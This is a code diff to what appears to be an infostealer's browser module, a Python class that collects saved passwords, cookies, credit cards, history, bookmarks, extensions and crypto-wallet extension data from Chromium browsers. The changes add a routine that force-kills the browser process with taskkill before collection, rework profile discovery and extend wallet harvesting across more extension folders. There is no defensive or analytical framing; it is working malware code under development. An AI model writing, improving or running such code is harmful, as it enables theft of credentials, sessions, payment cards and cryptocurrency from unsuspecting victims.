@@ -1,8 +1,8 @@
 from re import compile
-from os import path, listdir
 from base64 import b64decode
 from json import load, loads
 from typing import Tuple, List
+from os import path, listdir, system
 from datetime import datetime, timedelta
 from sqlite3 import connect, Connection, Cursor
 from ctypes import windll, byref, cdll, c_buffer
@@ -16,17 +16,30 @@ class Chromium:
     """
     Collects data from the browser.
     """
-    def __init__(self, browser_name: str, state_path: str, browser_path: str, statuses: List):
+    def __init__(self, browser_name: str, state_path: str, browser_path: str, process_name: str, statuses: List):
 
         self.__browser_name = browser_name
         self.__state_path = state_path
         self.__browser_path = browser_path
+        self.__process_name = process_name
         self.__statuses = statuses
         self.__profiles = None
 
         self.__storage = MemoryStorage()
         self.__config = ChromiumConfig()
         self.__path = path.join("Browsers", self.__browser_name)
+
+    def _kill_process(self):
+        """
+        Kills browser process.
+
+        Parameters:
+        - None.
+
+        Returns:
+        - None.
+        """
+        system(f"taskkill /f /im {self.__process_name}")
 
     def _get_profiles(self) -> List:
         """
@@ -38,10 +51,12 @@ class Chromium:
         Returns:
         - list: List of all browser profiles.
         """
-        if self.__browser_path[-9:] in ["User Data"]:
+        pattern = compile(r"Default|Profile \d+")
+        profiles = sum([pattern.findall(dir_path) for dir_path in listdir(self.__browser_path)], [])
+        profile_paths = [path.join(self.__browser_path, profile) for profile in profiles]
 
-            pattern = compile(r"Default|Profile \d+")
-            return [path.join(self.__browser_path, profile) for profile in sum([pattern.findall(dir_path) for dir_path in listdir(self.__browser_path)], [])]
+        if profile_paths:
+            return profile_paths
 
         return [self.__browser_path]
 
@@ -179,6 +194,10 @@ class Chromium:
         Returns:
         - None.
         """
+        if not path.exists(file_path):
+            print(f"[{self.__browser_name}]: No passwords file found")
+            return
+
         cursor, connection = self._get_db_connection(file_path)
         passwords_list = cursor.execute(self.__config.PasswordsSQL).fetchall()
 
@@ -186,6 +205,7 @@ class Chromium:
         connection.close()
 
         if not passwords_list:
+            print(f"[{self.__browser_name}]: No passwords found")
             return
 
         data = self.__config.PasswordsData
@@ -211,6 +231,10 @@ class Chromium:
         Returns:
         - None.
         """
+        if not path.exists(file_path):
+            print(f"[{self.__browser_name}]: No cookies file found")
+            return
+
         cursor, connection = self._get_db_connection(file_path)
         cookies_list = cursor.execute(self.__config.CookiesSQL).fetchall()
 
@@ -218,6 +242,7 @@ class Chromium:
         connection.close()
 
         if not cookies_list:
+            print(f"[{self.__browser_name}]: No cookies found")
             return
 
         cookies_list_filtered = [row for row in cookies_list if row[0] != ""]
@@ -245,6 +270,10 @@ class Chromium:
         Returns:
         - None.
         """
+        if not path.exists(file_path):
+            print(f"[{self.__browser_name}]: No cards file found")
+            return
+
         cursor, connection = self._get_db_connection(file_path)
         cards_list = cursor.execute(self.__config.CardsSQL).fetchall()
 
@@ -252,6 +281,7 @@ class Chromium:
         connection.close()
 
         if not cards_list:
+            print(f"[{self.__browser_name}]: No cards found")
             return
 
         data = self.__config.CardsData
@@ -277,6 +307,10 @@ class Chromium:
         Returns:
         - None.
         """
+        if not path.exists(file_path):
+            print(f"[{self.__browser_name}]: No history file found")
+            return
+
         cursor, connection = self._get_db_connection(file_path)
         results = cursor.execute(self.__config.HistorySQL).fetchall()
         history_list = [cursor.execute(self.__config.HistoryLinksSQL % int(item[0])).fetchone() for item in results]
@@ -285,6 +319,7 @@ class Chromium:
         connection.close()
 
         if not results:
+            print(f"[{self.__browser_name}]: No history found")
             return
 
         data = self.__config.HistoryData
@@ -310,10 +345,15 @@ class Chromium:
         Returns:
         - None.
         """
+        if not path.exists(file_path):
+            print(f"[{self.__browser_name}]: No bookmarks file found")
+            return
+
         file = self._get_file(file_path)
         bookmarks_list = sum([self.__config.BookmarksRegex.findall(item) for item in file.split("{")], [])
 
         if not bookmarks_list:
+            print(f"[{self.__browser_name}]: No bookmarks found")
             return
 
         data = self.__config.BookmarksData
@@ -338,10 +378,15 @@ class Chromium:
         Returns:
         - None.
         """
+        if not path.exists(extensions_path):
+            print(f"[{self.__browser_name}]: No extensions folder found")
+            return
+
         extensions_list = []
         extensions_dirs = listdir(extensions_path)
 
-        if len(extensions_dirs) == 0:
+        if not extensions_dirs:
+            print(f"[{self.__browser_name}]: No extensions found")
             return
 
         for dirpath in extensions_dirs:
@@ -379,22 +424,27 @@ class Chromium:
         Returns:
         - None.
         """
-        for wallet in self.__config.WalletLogs[self.__browser_name]:
+        if not path.exists(wallets):
+            print(f"[{self.__browser_name}]: No wallets found")
+            return
 
-            try:
+        for wallet in self.__config.WalletLogs:
+            for extension in wallet["folders"]:
 
-                extension_path = path.join(wallets, wallet["folder"])
+                try:
 
-                if not path.exists(extension_path):
-                    continue
+                    extension_path = path.join(wallets, extension)
 
-                self.__storage.add_from_disk(
-                    extension_path,
-                    path.join(self.__path, rf'{profile} {wallet["name"]}')
-                )
+                    if not path.exists(extension_path):
+                        continue
 
-            except Exception as e:
-                print(f"[{self.__browser_name}]: {repr(e)}")
+                    self.__storage.add_from_disk(
+                        extension_path,
+                        path.join("Wallets", rf'{self.__browser_name} {profile} {wallet["name"]}')
+                    )
+
+                except Exception as e:
+                    print(f"[{self.__browser_name}]: {repr(e)}")
 
     def _process_profile(self, profile: str) -> None:
         """
@@ -488,6 +538,7 @@ class Chromium:
         """
         try:
 
+            self._kill_process()
             self._check_paths()
             self._check_profiles()
 
